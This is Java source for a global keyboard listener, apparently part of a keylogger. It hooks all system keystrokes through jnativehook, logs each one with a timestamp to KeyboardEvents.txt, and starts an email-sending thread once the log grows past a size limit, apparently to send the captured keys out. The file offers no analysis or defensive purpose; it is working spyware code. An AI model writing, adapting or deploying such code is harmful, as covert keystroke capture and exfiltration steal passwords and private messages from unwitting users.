package events;

import javafx.application.Application;
import javafx.stage.Stage;
import logic.QueueBuffer;
import logic.TimeManager;
import logs.FileLogWriter;
import logs.SendEmail;
import logs.SendEmailThread;
import main.Main;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.util.concurrent.Callable;

public class GlobalKeyListener implements NativeKeyListener{

    private FileLogWriter writer = new FileLogWriter("KeyboardEvents.txt");
    private QueueBuffer<Character> buf = new QueueBuffer<>(5);
    private long fileSize = 0, maxFileSize=5000;

    public void setFileSize(long maxFileSize){
        this.maxFileSize = maxFileSize;
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
        System.out.println("Key Pressed: " + key);
        save(e, "Pressed");
        if(key.length()==1) buf.add(key.charAt(0));
        else buf.add(' ');
        if (buf.toString().equals("BREAK")) { //if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE)
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException e1) {
                e1.printStackTrace();
            }
        }
        if (buf.toString().equals("START")) {
            Main.run();
        }
        if(key.charAt(0) == 'P'){
            KeyboardEmulator.put();
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        save(e, "Realeased");
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
        save(e, "Typed");
    }

    private void save(NativeKeyEvent e, String message) {
        String str = TimeManager.getTime() + "\t" + message + ": " + e.getKeyCode() + " " + NativeKeyEvent.getKeyText(e.getKeyCode());
        writer.write(str);
        fileSize+=str.length();
        if(fileSize>maxFileSize){
            if(new File("KeyboardEvents.txt").length()>maxFileSize){
                fileSize=0;
                SendEmailThread smt = new SendEmailThread(writer);
                smt.run();
            }
        }
    }

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new GlobalKeyListener());
    }
}
